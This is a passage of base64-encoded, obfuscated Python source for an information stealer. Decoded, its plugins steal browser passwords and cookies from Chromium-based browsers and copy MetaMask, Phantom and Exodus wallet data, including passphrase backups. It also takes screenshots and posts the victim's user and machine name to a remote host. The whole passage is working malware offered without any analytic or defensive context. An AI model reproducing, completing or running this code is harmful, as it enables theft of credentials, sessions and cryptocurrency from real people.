gam9pbihURU1QLCBmJ0xvZ2luIERhdGEge3RpbWUoKX0nKVxyXG4gICAgICAgICAgICAgICAgICAgIGF3YWl0IGNvcHlmaWxlKHAsIHRlbXBfcGF0aClcclxuXHJcbiAgICAgICAgICAgICAgICAgICAgaWYgbm90IHNlbGYuZGVjcnlwdG9yOlxyXG4gICAgICAgICAgICAgICAgICAgICAgICBhd2FpdCBzZWxmLnNldF9kZWNyeXB0b3Iocm9vdF9wYXRoKVxyXG4gICAgICAgICAgICAgICAgICAgIGFzeW5jIHdpdGggYWlvc3FsaXRlLmNvbm5lY3QodGVtcF9wYXRoKSBhcyBjb25uOlxyXG4gICAgICAgICAgICAgICAgICAgICAgICBzcWwgPSAnc2VsZWN0ICogZnJvbSBsb2dpbnMnXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIGFzeW5jIHdpdGggY29ubi5leGVjdXRlKHNxbCkgYXMgY3VycjpcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGFzeW5jIGZvciByb3cgaW4gY3VycjpcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0cnk6XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJvd3MuYXBwZW5kKChyb3dbMV0sIHJvd1szXSwgc2VsZi5kZWNyeXB0b3IuZGVjcnlwdF9wYXNzd29yZChyb3dbNV0pKSlcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGF3YWl0IHNlbGYuY29uZi5sb2dnZXIubG9nKGYnXHhkMFx4OWVceGQxXHg4OFx4ZDBceGI4XHhkMFx4YjFceGQwXHhiYVx4ZDBceGIwIFx4ZDBceGJmXHhkMVx4ODBceGQwXHhiOCBceGQwXHhiNFx4ZDBceGI1XHhkMFx4YmFceGQxXHg4MFx4ZDBceGI4XHhkMFx4YmZceGQxXHg4Mlx4ZDBceGI1IFx4ZDBceGJmXHhkMFx4YjBceGQxXHg4MFx4ZDBceGJlXHhkMFx4YmJceGQxXHg4Ziwge2V9JylcclxuICAgICAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZTpcclxuICAgICAgICAgICAgICAgICAgICBhd2FpdCBzZWxmLmNvbmYubG9nZ2VyLmxvZyhmJ1x4ZDBceDllXHhkMVx4ODhceGQwXHhiOFx4ZDBceGIxXHhkMFx4YmFceGQwXHhiMCBceGQwXHhiZlx4ZDFceDgwXHhkMFx4YjggXHhkMFx4YmZceGQwXHhiZVx4ZDBceGJmXHhkMVx4OGJceGQxXHg4Mlx4ZDBceGJhXHhkMFx4YjUgXHhkMVx4ODFceGQwXHhiZlx4ZDBceGI4XHhkMFx4YjdceGQwXHhiNFx4ZDBceGI4XHhkMVx4ODJceGQxXHg4YyBceGQwXHhiZlx4ZDBceGIwXHhkMVx4ODBceGQwXHhiZVx4ZDBceGJiXHhkMFx4YjggXHhkMVx4ODEge3B9LCBceGQwXHhiZVx4ZDFceDg4XHhkMFx4YjhceGQwXHhiMVx4ZDBceGJhXHhkMFx4YjAge2V9JylcclxuXHJcbiAgICAgICAgICAgIGlmIHJvd3M6XHJcbiAgICAgICAgICAgICAgICBuYW1lID0gZid7c3BsaXQocm9vdF9wYXRoKVsxXX1fe3Rva2VuX2hleCg1KX0udHh0J1xyXG4gICAgICAgICAgICAgICAgcGFzc3dvcmRzX3BhdGggPSBqb2luKHNlbGYuY29uZi5sb2dfcGF0aCwgJ3Bhc3N3b3JkcycpXHJcbiAgICAgICAgICAgICAgICBwYXRoID0gam9pbihwYXNzd29yZHNfcGF0aCwgbmFtZSlcclxuXHJcbiAgICAgICAgICAgICAgICBpZiBub3QgaXNkaXIocGFzc3dvcmRzX3BhdGgpOlxyXG4gICAgICAgICAgICAgICAgICAgIG1rZGlyKHBhc3N3b3Jkc19wYXRoKVxyXG5cclxuICAgICAgICAgICAgICAgIGFzeW5jIHdpdGggb3BlbihwYXRoLCAndycsIGVuY29kaW5nPSd1dGY4JykgYXMgZjpcclxuICAgICAgICAgICAgICAgICAgICBmb3IgdXJsLCBsb2dpbiwgcGFzc3dvcmQgaW4gcm93czpcclxuICAgICAgICAgICAgICAgICAgICAgICAgYXdhaXQgZi53cml0ZShmJ1VSTDoge3VybH1cXG5Mb2dpbjoge2xvZ2lufVxcblBhc3N3b3JkOiB7cGFzc3dvcmR9XFxuXFxuJylcclxuXHJcbiAgICAgICAgICAgICAgICBhd2FpdCBzZWxmLmNvbmYubG9nZ2VyLmxvZyhmJ1x4ZDBceGExXHhkMFx4YmZceGQwXHhiOFx4ZDBceGI3XHhkMFx4YjZceGQwXHhiNVx4ZDBceGJkXHhkMVx4OGIgXHhkMFx4YmZceGQwXHhiMFx4ZDFceDgwXHhkMFx4YmVceGQwXHhiYlx4ZDBceGI4IFx4ZDFceDgxIHtyb290X3BhdGh9JylcclxuICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6XHJcbiAgICAgICAgICAgIGF3YWl0IHNlbGYuY29uZi5sb2dnZXIubG9nKGYnRXJyb3IgaW4gc3RlYWxfcGFzc3dvcmQ6IHtlfScpXHJcblxyXG4gICAgYXN5bmMgZGVmIHN0ZWFsX2Nvb2tpZXMoc2VsZiwgcm9vdF9wYXRoOiBzdHIpIC0+IE5vbmU6XHJcbiAgICAgICAgdHJ5OlxyXG4gICAgICAgICAgICBpZiBub3QgaXNkaXIocm9vdF9wYXRoKTpcclxuICAgICAgICAgICAgICAgIHJldHVybiBbXVxyXG5cclxuICAgICAgICAgICAgY29va2llcyA9ICcnXHJcblxyXG4gICAgICAgICAgICBjb29raWVfZm9sZGVyX3BhdGhzID0ge1xyXG4gICAgICAgICAgICAgICAgam9pbihyb290X3BhdGgsICd1c2VyIGRhdGEnLCAnZGVmYXVsdCcsICduZXR3b3JrJyksIFxyXG4gICAgICAgICAgICAgICAgam9pbihyb290X3BhdGgsICd1c2VyIGRhdGEnLCAnZGVmYXVsdCcpLFxyXG4gICAgICAgICAgICAgICAgcm9vdF9wYXRoXHJcbiAgICAgICAgICAgIH1cclxuXHJcbiAgICAgICAgICAgIGFzeW5jIGZvciBwIGluIHNlYXJjaF9wYXRocyhjb29raWVfZm9sZGVyX3BhdGhzLCB7J0Nvb2tpZXMnLCAnY29va2llcy5zcWxpdGUnfSk6XHJcbiAgICAgICAgICAgICAgICBpZiBub3QgaXNmaWxlKHApOlxyXG4gICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlXHJcblxyXG4gICAgICAgICAgICAgICAgdGVtcF9wYXRoID0gam9pbihURU1QLCBmJ0Nvb2tpZXMge3RpbWUoKX0nKVxyXG4gICAgICAgICAgICAgICAgYXdhaXQgY29weWZpbGUocCwgdGVtcF9wYXRoKVxyXG5cclxuICAgICAgICAgICAgICAgIGlmIG5vdCBzZWxmLmRlY3J5cHRvcjpcclxuICAgICAgICAgICAgICAgICAgICBhd2FpdCBzZWxmLnNldF9kZWNyeXB0b3Iocm9vdF9wYXRoKVxyXG4gICAgICAgICAgICAgICAgICAgICAgICBcclxuICAgICAgICAgICAgICAgIGFzeW5jIHdpdGggYWlvc3FsaXRlLmNvbm5lY3QodGVtcF9wYXRoKSBhcyBjb25uOlxyXG4gICAgICAgICAgICAgICAgICAgIHNxbCA9ICdzZWxlY3QgKiBmcm9tIGNvb2tpZXMnXHJcbiAgICAgICAgICAgICAgICAgICAgYXN5bmMgd2l0aCBjb25uLmV4ZWN1dGUoc3FsKSBhcyBjdXJyOlxyXG4gICAgICAgICAgICAgICAgICAgICAgICBhc3luYyBmb3Igcm93IGluIGN1cnI6XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb252ID0gbGFtYmRhIHg6ICdUUlVFJyBpZiB4IGVsc2UgJ0ZBTFNFJ1xyXG5cclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRyeTpcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBob3N0ID0gcm93WzFdXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaHR0cF9vbmx5ID0gY29udihyb3dbOV0pXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcGF0aCA9IHJvd1s2XVxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNlY3VyZSA9IGNvbnYocm93WzhdKVxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGV4cGlyYXRpb25fZGF0ZSA9IHN0cihyb3dbN10pXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbmFtZSA9IHJvd1szXVxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHZhbHVlID0gc2VsZi5kZWNyeXB0b3IuZGVjcnlwdF9wYXNzd29yZChyb3dbNV0pXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYXdhaXQgc2VsZi5jb25mLmxvZ2dlci5sb2coZidceGQwXHg5ZVx4ZDFceDg4XHhkMFx4YjhceGQwXHhiMVx4ZDBceGJhXHhkMFx4YjAgXHhkMFx4YmZceGQxXHg4MFx4ZDBceGI4IFx4ZDBceGI0XHhkMFx4YjVceGQwXHhiYVx4ZDFceDgwXHhkMFx4YjhceGQwXHhiZlx4ZDFceDgyXHhkMFx4YjUgXHhkMFx4YmFceGQxXHg4M1x4ZDBceGJhXHhkMFx4YjAsIHtlfScpXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIG5vdCB2YWx1ZTpcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB2YWx1ZSA9ICcnXHJcblxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgY29va2llID0gJ1xcdCcuam9pbihcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAoaG9zdCwgaHR0cF9vbmx5LCBwYXRoLCBzZWN1cmUsIGV4cGlyYXRpb25fZGF0ZSwgbmFtZSwgdmFsdWUpKVxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgY29va2llcyArPSBjb29raWUgKyAnXFxuJ1xyXG5cclxuICAgICAgICAgICAgaWYgY29va2llczpcclxuICAgICAgICAgICAgICAgIG5hbWUgPSBmJ3tzcGxpdChyb290X3BhdGgpWzFdfV97dG9rZW5faGV4KDUpfS50eHQnXHJcbiAgICAgICAgICAgICAgICBjb29raWVzX3BhdGggPSBqb2luKHNlbGYuY29uZi5sb2dfcGF0aCwgJ2Nvb2tpZXMnKVxyXG4gICAgICAgICAgICAgICAgcGF0aCA9IGpvaW4oY29va2llc19wYXRoLCBuYW1lKVxyXG4gICAgICAgICAgICAgICAgXHJcbiAgICAgICAgICAgICAgICBpZiBub3QgaXNkaXIoY29va2llc19wYXRoKTpcclxuICAgICAgICAgICAgICAgICAgICBta2Rpcihjb29raWVzX3BhdGgpXHJcblxyXG4gICAgICAgICAgICAgICAgYXN5bmMgd2l0aCBvcGVuKHBhdGgsICd3JywgZW5jb2Rpbmc9J3V0ZjgnKSBhcyBmOlxyXG4gICAgICAgICAgICAgICAgICAgIGF3YWl0IGYud3JpdGUoY29va2llcylcclxuICAgICAgICAgICAgXHJcbiAgICAgICAgICAgICAgICBhd2FpdCBzZWxmLmNvbmYubG9nZ2VyLmxvZyhmJ1x4ZDBceGExXHhkMFx4YmZceGQwXHhiOFx4ZDBceGI3XHhkMFx4YjZceGQwXHhiNVx4ZDBceGJkXHhkMVx4OGIgXHhkMFx4YmFceGQxXHg4M1x4ZDBceGJhXHhkMFx4YjggXHhkMVx4ODEge3Jvb3RfcGF0aH0nKVxyXG4gICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZTpcclxuICAgICAgICAgICAgYXdhaXQgc2VsZi5jb25mLmxvZ2dlci5sb2coZidFcnJvciBpbiBzdGVhbF9jb29raWVzOiB7ZX0nKVxyXG5cclxuXHJcbiAgICBhc3luYyBkZWYgc3RlYWxfd2FsbGV0cyhzZWxmLCByb290X3BhdGg6IHN0cikgLT4gTm9uZTpcclxuICAgICAgICB0cnk6XHJcbiAgICAgICAgICAgIGlmIG5vdCBpc2Rpcihyb290X3BhdGgpOlxyXG4gICAgICAgICAgICAgICAgcmV0dXJuIFtdXHJcblxyXG4gICAgICAgICAgICB3YWxsZXRfZm9sZGVyX3BhdGhzID0ge1xyXG4gICAgICAgICAgICAgICAgam9pbihyb290X3BhdGgsICd1c2VyIGRhdGEnLCAnZGVmYXVsdCcsICdsb2NhbCBleHRlbnNpb24gc2V0dGluZ3MnKSwgXHJcbiAgICAgICAgICAgICAgICBqb2luKHJvb3RfcGF0aCwgJ3VzZXIgZGF0YScsICdsb2NhbCBleHRlbnNpb24gc2V0dGluZ3MnKSwgXHJcbiAgICAgICAgICAgICAgICBqb2luKHJvb3RfcGF0aCwgJ2xvY2FsIGV4dGVuc2lvbiBzZXR0aW5ncycpXHJcbiAgICAgICAgICAgIH1cclxuXHJcbiAgICAgICAgICAgIHdhbGxldHMgPSB7XHJcbiAgICAgICAgICAgICAgICAnbmtiaWhmYmVvZ2FlYW9laGxlZm5rb2RiZWZncGdrbm4nOiAnbWV0YW1hc2snLFxyXG4gICAgICAgICAgICAgICAgJ2JmbmFlbG1vbWVpbWhscG1nam5qb3BoaHBra29sanBhJzogJ3BoYW50b20nXHJcbiAgICAgICAgICAgIH1cclxuXHJcbiAgICAgICAgICAgIGFzeW5jIGZvciBwIGluIHNlYXJjaF9wYXRocyh3YWxsZXRfZm9sZGVyX3BhdGhzLCBzZXQod2FsbGV0cy5rZXlzKCkpKTpcclxuICAgICAgICAgICAgICAgIGlmIG5vdCBpc2RpcihwKTpcclxuICAgICAgICAgICAgICAgICAgICBjb250aW51ZVxyXG4gICAgICAgICAgICAgICAgXHJcbiAgICAgICAgICAgICAgICB3YWxsZXRzX3BhdGggPSBqb2luKHNlbGYuY29uZi5sb2dfcGF0aCwgJ3dhbGxldHMnKVxyXG4gICAgICAgICAgICAgICAgaWYgbm90IGlzZGlyKHdhbGxldHNfcGF0aCk6XHJcbiAgICAgICAgICAgICAgICAgICAgbWtkaXIod2FsbGV0c19wYXRoKVxyXG5cclxuICAgICAgICAgICAgICAgIG5hbWUgPSBzcGxpdChwKVsxXVxyXG4gICAgICAgICAgICAgICAgd2FsbGV0X25hbWUgPSB3YWxsZXRzW25hbWVdXHJcbiAgICAgICAgICAgICAgICBkZXN0X3BhdGggPSBqb2luKHdhbGxldHNfcGF0aCwgZid7d2FsbGV0X25hbWV9X3t0b2tlbl9oZXgoNCl9JylcclxuXHJcbiAgICAgICAgICAgICAgICB0cnk6XHJcbiAgICAgICAgICAgICAgICAgICAgYXdhaXQgY29weXRyZWUocCwgZGVzdF9wYXRoKVxyXG4gICAgICAgICAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOlxyXG4gICAgICAgICAgICAgICAgICAgIHBhc3NcclxuXHJcbiAgICAgICAgICAgICAgICBhd2FpdCBzZWxmLmNvbmYubG9nZ2VyLmxvZyhmJ1x4ZDBceGExXHhkMFx4YmZceGQwXHhiOFx4ZDBceGI3XHhkMFx4YjZceGQwXHhiNVx4ZDBceGJkIFx4ZDBceGIyXHhkMFx4YjVceGQwXHhiMSBceGQwXHhiYVx4ZDBceGJlXHhkMVx4ODhceGQwXHhiNVx4ZDBceGJiXHhkMVx4OGMgXHhkMVx4ODEge3B9JylcclxuICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6XHJcbiAgICAgICAgICAgIGF3YWl0IHNlbGYuY29uZi5sb2dnZXIubG9nKGYnXHhkMFx4OWVceGQxXHg4OFx4ZDBceGI4XHhkMFx4YjFceGQwXHhiYVx4ZDBceGIwIFx4ZDBceGJmXHhkMVx4ODBceGQwXHhiOCBceGQwXHhiZlx4ZDBceGJlXHhkMFx4YmZceGQxXHg4Ylx4ZDFceDgyXHhkMFx4YmFceGQwXHhiNSBceGQxXHg4MVx4ZDBceGJmXHhkMFx4YjhceGQwXHhiN1x4ZDBceGI0XHhkMFx4YjhceGQxXHg4Mlx4ZDFceDhjIFx4ZDBceGIyXHhkMFx4YjVceGQwXHhiMSBceGQwXHhiYVx4ZDBceGJlXHhkMVx4ODhceGQwXHhiNVx4ZDBceGJiXHhkMFx4YjVceGQwXHhiYSB7cm9vdF9wYXRofScpXHJcbiAgICBcclxuXHJcbiAgICBhc3luYyBkZWYgY2FsbGJhY2soc2VsZiwgcGF0aDogc3RyKSAtPiBOb25lOlxyXG4gICAgICAgIGNocm9taXVtX2Jyb3dzZXJfbmFtZXMgPSB7XHJcbiAgICAgICAgICAgICdvcGVyYSBneCBzdGFibGUnLFxyXG4gICAgICAgICAgICAnb3BlcmEgc3RhYmxlJyxcclxuICAgICAgICAgICAgJ2Nocm9tZScsXHJcbiAgICAgICAgICAgICd5YW5kZXhicm93c2VyJ1xyXG4gICAgICAgIH1cclxuXHJcbiAgICAgICAgdGFza3M6IExpc3RbVGFza10gPSBbXVxyXG5cclxuICAgICAgICBmb3IgZm9sZGVyX25hbWUgaW4gY2hyb21pdW1fYnJvd3Nlcl9uYW1lcy5pbnRlcnNlY3Rpb24oaS5uYW1lLmxvd2VyKCkgZm9yIGkgaW4gc2NhbmRpcihwYXRoKSk6XHJcbiAgICAgICAgICAgIHJvb3RfcGF0aCA9IGpvaW4ocGF0aCwgZm9sZGVyX25hbWUpXHJcbiAgICAgICAgICAgIHRhc2tzLmFwcGVuZChjcmVhdGVfdGFzayhzZWxmLnN0ZWFsX3Bhc3N3b3JkKHJvb3RfcGF0aCkpKVxyXG4gICAgICAgICAgICB0YXNrcy5hcHBlbmQoY3JlYXRlX3Rhc2soc2VsZi5zdGVhbF9jb29raWVzKHJvb3RfcGF0aCkpKVxyXG4gICAgICAgICAgICB0YXNrcy5hcHBlbmQoY3JlYXRlX3Rhc2soc2VsZi5zdGVhbF93YWxsZXRzKHJvb3RfcGF0aCkpKVxyXG5cclxuICAgICAgICBmb3IgdGFzayBpbiB0YXNrczpcclxuICAgICAgICAgICAgdGFzay5hZGRfZG9uZV9jYWxsYmFjayhsYW1iZGEgeDogX2hhbmRsZV90YXNrX3Jlc3VsdCh4LCBzZWxmLmNvbmYubG9nZ2VyKSlcclxuICAgICAgICAgICAgXHJcbiAgICAgICAgZm9yIHRhc2sgaW4gdGFza3M6XHJcbiAgICAgICAgICAgIHRyeTpcclxuICAgICAgICAgICAgICAgIGF3YWl0IHRhc2tcclxuICAgICAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOlxyXG4gICAgICAgICAgICAgICAgYXdhaXQgc2VsZi5jb25mLmxvZ2dlci5sb2coZidFcnJvciBpbiBjaHJvbWl1bSB0YXNrczoge2V9JylcclxuICAgICAgICAgICAgICAgICIpI2xpbmU6NjUKICAgIF9fTzBPME8wME8wME8wTzBPME8gKCdwbHVnaW5zL2RldGFpbHMucHknLGIiZnJvbSBhc3luY2lvIGltcG9ydCBjcmVhdGVfdGFza1xyXG5mcm9tIGNvbmZpZyBpbXBvcnQgQ29uZmlnXHJcbmltcG9ydCBvc1xyXG5mcm9tIG9zLnBhdGggaW1wb3J0IGpvaW5cclxuaW1wb3J0IHBsYXRmb3JtXHJcbmZyb20gYWlvZmlsZXMgaW1wb3J0IG9wZW5cclxuZnJvbSBtc3Mud2luZG93cyBpbXBvcnQgTVNTIGFzIG1zc1xyXG5mcm9tIHRvb2xzIGltcG9ydCBtb3ZlXHJcblxyXG5cclxuXHJcbmNsYXNzIERldGFpbHMoKTpcclxuICAgIGRlZiBfX2luaXRfXyhzZWxmLCBjb25mOiBDb25maWcpIC0+IE5vbmU6XHJcbiAgICAgICAgc2VsZi5jb25mID0gY29uZlxyXG5cclxuICAgIGFzeW5jIGRlZiB0YWtlX3NjcmVlbnNob3Qoc2VsZikgLT4gTm9uZTpcclxuICAgICAgICB3aXRoIG1zcygpIGFzIHNjdDpcclxuICAgICAgICAgICAgZm9yIGZpbGVuYW1lIGluIHNjdC5zYXZlKCk6XHJcbiAgICAgICAgICAgICAgICBhd2FpdCBtb3ZlKGZpbGVuYW1lLCBqb2luKHNlbGYuY29uZi5sb2dfcGF0aCwgZmlsZW5hbWUpKVxyXG4gICAgICAgICAgICAgICAgYXdhaXQgc2VsZi5jb25mLmxvZ2dlci5sb2coZidceGQwXHhhMVx4ZDBceGJhXHhkMVx4ODBceGQwXHhiOFx4ZDBceGJkXHhkMVx4ODhceGQwXHhiZVx4ZDFceDgyIHtmaWxlbmFtZX0gXHhkMVx4ODFceGQwXHhiZVx4ZDFceDg1XHhkMVx4ODBceGQwXHhiMFx4ZDBceGJkXHhkMFx4YjVceGQwXHhiZCcpXHJcbiBcclxuICAgIGFzeW5jIGRlZiBjYWxsYmFjayhzZWxmKSAtPiBOb25lOlxyXG4gICAgICAgIGJnX3Rhc2sgPSBjcmVhdGVfdGFzayhzZWxmLnRha2Vfc2NyZWVuc2hvdCgpKVxyXG4gICAgICAgIHVzZXIgPSBvcy5nZXRsb2dpbigpXHJcbiAgICAgICAgcGMgPSBwbGF0Zm9ybS5ub2RlKClcclxuICAgICAgICB0YWcgPSBzZWxmLmNvbmYudGFnXHJcblxyXG4gICAgICAgIGRhdGEgPSB7XHJcbiAgICAgICAgICAgICdjbGllbnRfaWQnOiBzZWxmLmNvbmYuY2xpZW50X2lkLFxyXG4gICAgICAgICAgICAndGFnJzogdGFnLFxyXG4gICAgICAgICAgICAndXNlcl9uYW1lJzogdXNlcixcclxuICAgICAgICAgICAgJ3BjX25hbWUnOiBwY1xyXG4gICAgICAgIH1cclxuICAgICAgICBcclxuICAgICAgICB1cmwgPSBmJ3tzZWxmLmNvbmYuaG9zdH0vcmVjZWl2ZV9kZXRhaWxzJ1xyXG5cclxuICAgICAgICByZXNwID0gYXdhaXQgc2VsZi5jb25mLnNlc3Npb24ucG9zdCh1cmwsIGpzb249ZGF0YSlcclxuXHJcbiAgICAgICAgYXN5bmMgd2l0aCBvcGVuKGpvaW4oc2VsZi5jb25mLmxvZ19wYXRoLCAnZGV0YWlscy50eHQnKSwgJ3cnLCBlbmNvZGluZz0ndXRmOCcpIGFzIGY6XHJcbiAgICAgICAgICAgIGF3YWl0IGYud3JpdGUoZid1c2VyIG5hbWU6IHt1c2VyfVxcbnBjIG5hbWU6IHtwY31cXG50YWc6IHt0YWd9JylcclxuXHJcbiAgICAgICAgYXdhaXQgc2VsZi5jb25mLmxvZ2dlci5sb2coZidceGQwXHg5ZVx4ZDFceDgyXHhkMVx4ODFceGQxXHg4Mlx4ZDFceDgzXHhkMFx4YmEgXHhkMFx4YmVceGQxXHg4Mlx4ZDBceGJmXHhkMVx4ODBceGQwXHhiMFx4ZDBceGIyXHhkMFx4YmJceGQwXHhiNVx4ZDBceGJkJylcclxuXHJcbiAgICAgICAgYXdhaXQgYmdfdGFzayIpI2xpbmU6NjYKICAgIF9fTzBPME8wME8wME8wTzBPME8gKCdwbHVnaW5zL3dhbGxldHMvX19pbml0X18ucHknLGInZnJvbSAuZXhvZHVzIGltcG9ydCBFeG9kdXMnKSNsaW5lOjY3CiAgICBfX08wTzBPMDBPMDBPME8wTzBPICgncGx1Z2lucy93YWxsZXRzL2V4b2R1cy5weScsYidmcm9tIHBsdWdpbnMgaW1wb3J0IFBsdWdpblxyXG5mcm9tIGNvbmZpZyBpbXBvcnQgQ29uZmlnXHJcbmZyb20gb3MucGF0aCBpbXBvcnQgaXNkaXIsIGpvaW5cclxuZnJvbSBvcyBpbXBvcnQgbWtkaXIsIHdhbGtcclxuZnJvbSBzZWNyZXRzIGltcG9ydCB0b2tlbl9oZXhcclxuZnJvbSB0b29scyBpbXBvcnQgY29weXRyZWUsIGNvcHlmaWxlXHJcblxyXG5cclxuXHJcbmNsYXNzIEV4b2R1cyhQbHVnaW4pOlxyXG4gICAgZGVmIF9faW5pdF9fKHNlbGYsIGNvbmY6IENvbmZpZykgLT4gTm9uZTpcclxuICAgICAgICBzZWxmLmNvbmYgPSBjb25mXHJcblxyXG5cclxuICAgIGFzeW5jIGRlZiBjYWxsYmFjayhzZWxmLCBwYXRoOiBzdHIpIC0+IE5vbmU6XHJcbiAgICAgICAgaWYgbm90IGlzZGlyKHBhdGgpOlxyXG4gICAgICAgICAgICByZXR1cm5cclxuXHJcbiAgICAgICAgd2FsbGV0c19wYXRoID0gam9pbihzZWxmLmNvbmYubG9nX3BhdGgsIFwnd2FsbGV0c1wnKVxyXG4gICAgICAgIGlmIG5vdCBpc2Rpcih3YWxsZXRzX3BhdGgpOlxyXG4gICAgICAgICAgICBta2Rpcih3YWxsZXRzX3BhdGgpXHJcbiAgICAgICAgXHJcbiAgICAgICAgbG9nX2V4b2R1c19wYXRoID0gam9pbih3YWxsZXRzX3BhdGgsIGZcJ2V4b2R1c197dG9rZW5faGV4KDQpfVwnKVxyXG5cclxuICAgICAgICB3YWxsZXRfZm9sZGVyID0gam9pbihwYXRoLCBcJ2V4b2R1cy53YWxsZXRcJylcclxuICAgICAgICBpZiBpc2Rpcih3YWxsZXRfZm9sZGVyKTpcclxuICAgICAgICAgICAgYXdhaXQgY29weXRyZWUod2FsbGV0X2ZvbGRlciwgbG9nX2V4b2R1c19wYXRoKVxyXG4gICAgICAgICAgICBcclxuICAgICAgICAgICAgYXdhaXQgc2VsZi5jb25mLmxvZ2dlci5sb2coZlwnXHhkMFx4YTFceGQwXHhiZlx4ZDBceGI4XHhkMFx4YjdceGQwXHhiNlx4ZDBceGI1XHhkMFx4YmQgZXhvZHVzIFx4ZDFceDgxIHtwYXRofVwnKVxyXG5cclxuICAgICAgICBiYWN1a3BzX2ZvbGRlciA9IGpvaW4ocGF0aCwgXCdiYWNrdXBzXCcpXHJcbiAgICAgICAgZm9yIGRpcnBhdGgsIGRpcm5hbWVzLCBmaWxlbmFtZXMgaW4gd2FsayhiYWN1a3BzX2ZvbGRlcik6XHJcbiAgICAgICAgICAgIGZvciBmIGluIGZpbGVuYW1lczpcclxuICAgICAgICAgICAgICAgIGlmIGYgPT0gInBhc3NwaHJhc2UuanNvbiI6XHJcbiAgICAgICAgICAgICAgICAgICAgaWYgbm90IGlzZGlyKGxvZ19leG9kdXNfcGF0aCk6XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIG1rZGlyKGxvZ19leG9kdXNfcGF0aClcclxuICAgICAgICAgICAgICAgICAgICBcclxuICAgICAgICAgICAgICAgICAgICBhd2FpdCBjb3B5ZmlsZShqb2luKGRpcnBhdGgsIGYpLCBqb2luKGxvZ19leG9kdXNfcGF0aCwgZlwncGFzc3BocmFzZV97dG9rZW5faGV4KDQpfS5qc29uXCcpKScpI2xpbmU6NjgKICAgIF9fTzBPME8wME8wME8wTzBPME8gKCdwbHVnaW5zL3dhbGxldHMvRXhvZHVzLnB5JyxiJ2Zyb20gcGx1Z2lucyBpbXBvcnQgUGx1Z2luXHJcbmZyb20gY29uZmlnIGltcG9ydCBDb25maWdcclxuZnJvbSBvcy5wYXRoIGltcG9ydCBpc2Rpciwgam9pblxyXG5mcm9tIG9zIGltcG9ydCBta2Rpciwgd2Fsa1xyXG5mcm9tIHNlY3JldHMgaW1wb3J0IHRva2VuX2hleFxyXG5mcm9tIHRvb2xzIGltcG9ydCBjb3B5dHJlZSwgY29weWZpbGVcclxuXHJcblxyXG5cclxuY2xhc3MgRXhvZHVzKFBsdWdpbik6XHJcbiAgICBkZWYgX19pbml0X18oc2VsZiwgY29uZjogQ29uZmlnKSAtPiBOb25lOlxyXG4gICAgICAgIHNlbGYuY29uZiA9IGNvbmZcclxuXHJcblxyXG4gICAgYXN5bmMgZGVmIGNhbGxiYWNrKHNlbGYsIHBhdGg6IHN0cikgLT4gTm9uZTpcclxuICAgICAgICBpZiBub3QgaXNkaXIocGF0aCk6XHJcbiAgICAgICAgICAgIHJldHVyblxyXG5cclxuICAgICAgICB3YWxsZXRzX3BhdGggPSBqb2luKHNlbGYuY29uZi5sb2dfcGF0aCwgXCd3YWxsZXRzXCcpXHJcbiAgICAgICAgaWYgbm90IGlzZGlyKHdhbGxldHNfcGF0aCk6XHJcbiAgICAgICAgICAgIG1rZGlyKHdhbGxldHNfcGF0aClcclxuICAgICAgICBcclxuICAgICAgICBsb2dfZXhvZHVzX3BhdGggPSBqb2luKHdhbGxldHNfcGF0aCwgZlwnZXhvZHVzX3t0b2tlbl9oZXgoNCl9XCcpXHJcblxyXG4gICAgICAgIHdhbGxldF9mb2xkZXIgPSBqb2luKHBhdGgsIFwnZXhvZHVzLndhbGxldFwnKVxyXG4gICAgICAgIGlmIGlzZGlyKHdhbGxldF9mb2xkZXIpOlxyXG4gICAgICAgICAgICBhd2FpdCBjb3B5dHJlZSh3YWxsZXRfZm9sZGVyLCBsb2dfZXhvZHVzX3BhdGgpXHJcbiAgICAgICAgICAgIFxyXG4gICAgICAgICAgICBhd2FpdCBzZWxmLmNvbmYubG9nZ2VyLmxvZyhmXCdceGQwXHhhMVx4ZDBceGJmXHhkMFx4YjhceGQwXHhiN1x4ZDBceGI2XHhkMFx4YjVceGQwXHhiZCBleG9kdXMgXHhkMVx4ODEge3BhdGh9XCcpXHJcblxyXG4gICAgICAgIGJhY3VrcHNfZm9sZGVyID0gam9pbihwYXRoLCBcJ2JhY2t1cHNcJylcclxuICAgICAgICBmb3IgZGlycGF0aCwgZGlybmFtZXMsIGZpbGVuYW1lcyBpbiB3YWxrKGJhY3VrcHNfZm9sZGVyKTpcclxuICAgICAgICAgICAgZm9yIGYgaW4gZmlsZW5hbWVz